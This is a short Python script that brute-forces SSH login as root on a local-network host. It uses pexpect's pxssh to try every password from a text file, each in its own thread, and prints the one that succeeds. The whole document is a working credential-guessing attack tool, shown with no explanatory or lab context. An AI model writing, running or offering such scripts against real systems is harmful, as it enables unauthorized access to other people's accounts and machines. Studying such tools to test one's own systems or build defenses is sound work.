#! /usr/bin/python3
from pexpect import pxssh 
from threading import Thread

def connect(host,user,password):
    try:
        ssh = pxssh.pxssh()
        ssh.login(host,user,password)
        print("Password Found :- {}".format(password))
    except:
        pass


if __name__ == "__main__":
    host = "192.168.0.112"
    user = "root"
    passFile = "password.txt"
    with open(passFile,"r") as f:
        for line in f.readlines():
            password = line.strip('\n')
            new_thread = Thread(target=connect,args=(host,user,password))
            new_thread.start()
